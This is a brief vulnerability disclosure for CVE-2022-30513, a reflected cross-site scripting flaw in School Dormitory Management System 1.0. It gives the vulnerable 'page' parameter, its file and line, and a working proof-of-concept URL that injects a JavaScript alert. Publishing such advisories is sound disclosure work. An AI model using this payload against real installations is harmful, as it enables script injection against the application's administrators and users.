# CVE-2022-30513

School Dormitory Management System 1.0 - Reflected XSS

#### Exploit Title: School Dormitory Management System 1.0 - Reflected XSS
#### Date: 2022-05-25
#### CVE: CVE-2022-30513
#### Exploit Author: Abdulaziz Saad (@b4zb0z)
#### Vendor Homepage: https://www.sourcecodester.com/
#### Software Link: https://www.sourcecodester.com/php/15319/school-dormitory-management-system-phpoop-free-source-code.html
#### Version: 1.0
#### Tested on: LAMP, Ubuntu

-----


#### [#] Vulnerability Location:

  `$_GET['page']` in `/dms/admin/inc/navigation.php:125`

----

#### [#] Exploitation :

  `http://localhost/dms/admin/?page=%27;%20alert(%22b4zb0z%22);%20s=%27`
